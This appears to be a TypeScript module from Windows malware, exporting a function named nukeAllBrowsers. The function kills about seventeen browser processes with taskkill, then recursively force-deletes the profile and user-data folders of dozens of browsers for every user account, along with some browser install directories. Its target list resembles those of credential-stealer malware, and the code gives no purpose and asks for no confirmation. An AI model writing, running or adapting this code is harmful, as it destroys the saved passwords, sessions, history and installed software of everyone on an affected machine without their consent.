import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';

export function nukeAllBrowsers() {
    const userNames = fs.readdirSync('C:\\Users');
    const appDataLocal = process.env.LOCALAPPDATA;
    const appDataRoaming = process.env.APPDATA;
    const programFiles = process.env.ProgramFiles;
    const programFilesX86 = process.env['ProgramFiles(x86)'];

    const browserTargets = [
        "chrome.exe", "opera.exe", "msedge.exe", "brave.exe", "vivaldi.exe",
        "firefox.exe", "yandex.exe", "dragon.exe", "torch.exe", "epic.exe",
        "orbitum.exe", "atom.exe", "kometa.exe", "amigo.exe", "opera.exe",
        "opera_gx.exe", "browser.exe",
    ];

    browserTargets.forEach(exe => {
        try { execSync(`taskkill /F /IM ${exe} /T`, { stdio: 'ignore' }); } catch { }
    });

    const pathsToNuke: string[] = [];

    userNames.forEach(user => {
        const baseLocal = path.join('C:\\Users', user, 'AppData', 'Local');
        const baseRoaming = path.join('C:\\Users', user, 'AppData', 'Roaming');

        pathsToNuke.push(
            path.join(baseLocal, 'Google\\Chrome'),
            path.join(baseLocal, 'Microsoft\\Edge'),
            path.join(baseLocal, 'BraveSoftware\\Brave-Browser'),
            path.join(baseLocal, 'Vivaldi'),
            path.join(baseLocal, 'Yandex\\YandexBrowser'),
            path.join(baseLocal, 'Comodo\\Dragon'),
            path.join(baseLocal, 'Torch\\User Data'),
            path.join(baseLocal, 'Epic Privacy Browser\\User Data'),
            path.join(baseLocal, 'Orbitum\\User Data'),
            path.join(baseLocal, 'Atom\\User Data'),
            path.join(baseLocal, 'Chromium\\User Data'),
            path.join(baseLocal, '7Star\\7Star\\User Data'),
            path.join(baseLocal, 'CentBrowser\\User Data'),
            path.join(baseLocal, 'Chedot\\User Data'),
            path.join(baseLocal, 'CocCoc\\Browser\\User Data'),
            path.join(baseLocal, 'Elements Browser\\User Data'),
            path.join(baseRoaming, 'Opera Software'),
            path.join(baseLocal, 'Opera Software'),
            path.join(baseRoaming, 'Mozilla\\Firefox'),
            path.join(baseLocal, 'Mozilla\\Firefox'),
            path.join(baseRoaming, 'Waterfox'),
            path.join(baseRoaming, 'Pale Moon'),
            path.join(baseLocal, 'Programs', 'Opera'),
            path.join(baseLocal, 'Programs', 'Opera GX'),
            path.join(baseRoaming, 'Opera Software', 'Opera GX Stable'),
            path.join(baseLocal, 'Opera Software', 'Opera GX Stable'),
        );
    });

    if (programFiles) {
        pathsToNuke.push(
            path.join(programFiles, 'Google\\Chrome'),
            path.join(programFiles, 'Mozilla Firefox'),
            path.join(programFiles, 'Opera'),
            path.join(programFiles, 'BraveSoftware')
        );
    }

    pathsToNuke.forEach(p => {
        if (fs.existsSync(p)) {
            try {
                fs.rmSync(p, { recursive: true, force: true });
            } catch (e) { }
        }
    });
}